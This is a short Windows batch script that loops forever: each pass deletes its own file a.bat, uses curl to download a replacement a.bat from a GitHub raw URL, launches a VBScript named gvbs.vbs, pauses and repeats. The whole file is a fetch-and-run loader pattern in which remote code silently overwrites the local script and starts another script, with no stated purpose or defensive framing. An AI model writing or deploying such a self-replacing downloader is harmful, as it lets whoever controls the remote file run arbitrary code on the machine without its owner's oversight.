@echo off
:a
del a.bat /a /q
timeout /t 2 /nobreak >nul
curl https://raw.githubusercontent.com/SeduHome/Test/main/a.bat>a.bat
timeout /t 2 /nobreak >nul
start gvbs.vbs
timeout /t 9 /nobreak >nul
goto a
